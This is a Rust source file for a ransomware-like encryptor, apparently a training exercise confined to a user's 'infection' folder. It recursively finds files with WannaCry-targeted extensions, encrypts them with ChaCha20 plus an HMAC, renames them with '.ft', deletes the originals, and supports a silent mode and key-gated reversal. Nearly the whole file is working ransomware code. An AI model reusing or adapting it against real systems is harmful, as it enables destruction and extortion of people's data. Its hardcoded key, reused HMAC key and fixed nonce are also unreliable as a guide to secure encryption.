use chacha20::ChaCha20;
use chacha20::cipher::{KeyIvInit, StreamCipher};
use std::str;
use std::env;
use glob::{GlobError, glob};
use std::path::{Path, PathBuf};
use std::ffi::OsStr;
use clap::Parser;
use hmac::{Hmac, Mac};
use sha2::Sha256;

type HmacSha256 = Hmac<Sha256>;

const HMAC_KEY: &[u8] = b"01A4AF8D6B929C846056293AE3E33327";

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {

    #[arg(short, long)]
    silent: bool,

    #[arg(short, long)]
    reverse: Option<String>,
}

#[derive(Debug)]
struct CipherItems {
    key: [u8; 32],
    nonce: [u8; 12],
    silent: bool,
}

fn get_file_data(filepath: &PathBuf) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    // println!("Trying to read : {}", filepath.display());
    let data = std::fs::read(filepath)?;
    // println!("Successfully got data from : {}", filepath.display());

    Ok(data)
}

fn write_file_data(filepath: &PathBuf, data: Vec<u8>) -> Result<(), Box<dyn std::error::Error>>{
    std::fs::write(filepath, data)?;
    // println!("Wrote data in : {}", filepath.display());
    Ok(())
}

fn handle_file(old_file_path: &PathBuf, new_file_path: &PathBuf) -> std::io::Result<()> {
    if old_file_path != new_file_path {
        std::fs::remove_file(old_file_path)?;
    }
    // println!("Deleted : {:?}", old_file_path);
    Ok(())
}

fn add_ft_ext(filepath: &PathBuf) -> PathBuf {

    let ext = filepath.extension().unwrap();
    let verif = OsStr::new("ft");

    if ext != verif {
        let new_ext = format!("{}.ft", ext.to_str().unwrap());
        let mut new_filepath = filepath.clone();
        new_filepath.set_extension(new_ext);
        return new_filepath;
    }
    filepath.clone()
}

fn rm_ft_ext(filepath: &PathBuf) -> PathBuf {

    let mut new_filepath = filepath.clone();

    let ext = filepath.extension().unwrap();

    if ext == "ft" {
        new_filepath.set_extension("");
        if new_filepath.extension().is_none() {
            new_filepath.set_extension("ft");
        }
    }

    // println!("{:?}", filepath);
    new_filepath
}

fn compute_hmac(data: &[u8]) -> Vec<u8> {
    let mut mac = HmacSha256::new_from_slice(HMAC_KEY).expect("HMAC init failed");
    mac.update(data);
    mac.finalize().into_bytes().to_vec()
}

fn encrypt(cipher: &mut dyn StreamCipher, data: &Vec<u8>, filepath: &PathBuf) -> Result<Vec<u8>, Box<dyn std::error::Error>>{
    let mut encrypted_data = data.clone();

    cipher.apply_keystream(&mut encrypted_data);

    // println!("{}", data.len());

    if data.len() > 32 {
        let verif_hmac = compute_hmac(&data[..data.len() - 32]);

        // println!("verif_Hmac = {:?}\n end_of_file = {:?}", verif_hmac, &data[data.len() - 32..]);
    
        if verif_hmac == &data[data.len() - 32..] {
            let path = filepath.to_str().unwrap();
            return Err(format!("Can't encrypt {} : the file has already been encrypted", path).into());
        }
    }

    let hmac = compute_hmac(&encrypted_data);

    encrypted_data.extend_from_slice(&hmac);

    Ok(encrypted_data)
}

fn decrypt(cipher: &mut dyn StreamCipher, data: &Vec<u8>, filepath: &PathBuf) -> Result<Vec<u8>, Box<dyn std::error::Error>>{
    
    // println!("{}", data.len());

    if data.len() < 32 {
        let path = filepath.to_str().unwrap();
        return Err(format!("Can't decrypt {} : the file is too short", path).into());
    }
    let hmac_stored = &data[data.len() - 32..];

    let hmac = compute_hmac(&data[..data.len() - 32]);

    if hmac_stored != hmac {
        let path = filepath.to_str().unwrap();
        return Err(format!("Can't decrypt {} : the file has been altered", path).into());
    }

    let mut decrypted_data = data.clone();

    decrypted_data.drain(data.len() - 32..);

    cipher.apply_keystream(&mut decrypted_data);

    Ok(decrypted_data)
}


fn crypt(items: &CipherItems, filepath: &PathBuf, fn_ptr: fn(&PathBuf) -> PathBuf) -> Result<(), Box<dyn std::error::Error>>{
    let mut cipher = ChaCha20::new(&items.key.into(), &items.nonce.into());

    let data = get_file_data(filepath)?;

    let data_to_write: Vec<u8>;

    if fn_ptr == add_ft_ext {
        data_to_write = match encrypt(&mut cipher, &data, filepath) {
            Ok(data_to_write) => data_to_write,
            Err(e) => {
                // println!("{:?}", e);
                return Err(e)
            },
        };
    }
    else {
        data_to_write = match decrypt(&mut cipher, &data, filepath) {
            Ok(data_to_write) => data_to_write,
            Err(e) => {
                // println!("{:?}", e);
                return Err(e)
            },
        };
    }   


    let new_file_path = fn_ptr(filepath);

    let _delete_file = match handle_file(filepath, &new_file_path) {
        Ok(file) => file,
        Err(e) => panic!("{e}"),
    };

    write_file_data(&new_file_path, data_to_write)?;

    if !items.silent {
        println!("{} => {} successfully", filepath.display(), new_file_path.display());
    }

    Ok(())
}

fn get_extensions() -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let wannacry_ext = get_file_data(&Path::new("wannacry_known_extensions.txt").to_path_buf())?;

    let str = match std::str::from_utf8(&wannacry_ext) {
        Ok(s) => s,
        Err(_e) => panic!("Can't find wannacry_known_extensions.txt"),
    };

    let str = str.replace(".", "");

    let v_ext: Vec<String> = str
    .lines()
    .map(|s| s.replace(".", ""))
    .filter(|s| !s.is_empty())
    .collect();

    Ok(v_ext)
}

fn insert_in_vector(entry: Result<PathBuf, GlobError>, valid_files: &mut Vec<PathBuf>, v_ext: &[String]) {
    match entry {
        Ok(path) => {
            for ext in v_ext {
                if path
                    .extension()
                    .and_then(|ext| ext.to_str())
                    .filter(|&ext_str| ext_str == ext)
                    .is_some()
                    {
                        valid_files.push(path.clone());
                    }
            }
        },
        Err(e) => println!("{:?}", e),
    }
}

fn get_valid_files(v_ext: &[String], user: &str, extensions: &str) -> Vec<PathBuf> {
    let mut valid_files: Vec<PathBuf> = Vec::new();

    let master_path = format!("/home/{}/infection/", user);

    for entry in glob(&format!("{}{}", master_path, extensions)).expect("Failed to list directory") {
        insert_in_vector(entry,&mut valid_files, v_ext);
    }
    valid_files.sort_unstable();
    valid_files.dedup();
    valid_files
}

fn debug_files(files: &[PathBuf]) {
    println!("found {} file(s)", files.len());
    for file in files {
        println!("{}", file.display());
    }
}

fn main() -> Result<(), Box<dyn std::error::Error>>{

    env::set_var("RUST_BACKTRACE", "1");
    let user = match env::var("USER"){
        Ok(user) => user,
        Err(_e) => return Err("No USER in env".into()),
    };

    let args = Args::parse();

    let hex_key = "01A4AF8D6B929C846056293AE3E33327";
    let nonce: [u8;12] = [0x24; 12];

    if let Some(reverse) = &args.reverse {
        if hex_key != reverse {
            return Err("Wrong key given as an argument".into());
        }
    }

    let mut key = [0u8; 32];

    key.copy_from_slice(hex_key.as_bytes());

    let items = CipherItems {
        key: key,
        nonce: nonce,
        silent: args.silent,
    };


    let v_ext = get_extensions()?;

    let valid_files: Vec<PathBuf>;

    if args.reverse.is_some() {
        valid_files = get_valid_files(&v_ext, &user, "**/*.ft");
    }
    else {
        valid_files = get_valid_files(&v_ext, &user, "**/*");
    }

    if valid_files.is_empty() {
        return Err("Path doesn't contain file".into());
    }

    if !items.silent {
        debug_files(&valid_files);
    }

    for file in &valid_files {
        if args.reverse.is_some() {
            _ = crypt(&items, &file, rm_ft_ext);
        }
        else {
            _ = crypt(&items, &file, add_ft_ext);
        }
    }

    Ok(())
}
